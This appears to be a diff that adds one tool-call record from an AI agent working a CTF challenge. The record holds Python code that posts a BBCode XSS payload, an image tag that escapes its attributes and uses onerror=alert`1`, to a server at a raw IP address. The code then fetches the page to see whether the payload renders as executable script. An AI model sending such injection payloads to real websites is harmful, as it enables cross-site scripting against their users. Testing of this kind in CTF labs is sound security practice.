@@ -1,0 +1,10 @@
+{
+  "tool": "py_run",
+  "arguments": {
+    "code": "\nimport time, urllib.request, urllib.parse\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef get(data=None):\n    d = urllib.parse.urlencode(data).encode() if data is not None else None\n    with op.open(BASE, data=d, timeout=20) as r:\n        return r.read().decode(\"gb18030\", \"replace\")\n\nMARK = \"ESC9\"\npayload = \"[/img][img]x[img]onerror=alert`1` [/img]\" + MARK\nprint(\"SENT:\", payload)\nget({\"content\": payload})\ntime.sleep(0.3)\nbody = get()\ni = body.find(MARK)\nstart = body.rfind(\"<pre>\", 0, i)\nprint(\"\\n渲染结果(raw):\")\nprint(repr(body[start:i+len(MARK)]))\n",
+    "timeout": 120,
+    "wp_purpose": "验证 BBCode 属性逃逸能否形成可执行 onerror",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "operation_id": "b74a37c5e9f049ecac9ad86fa050b680"
+}
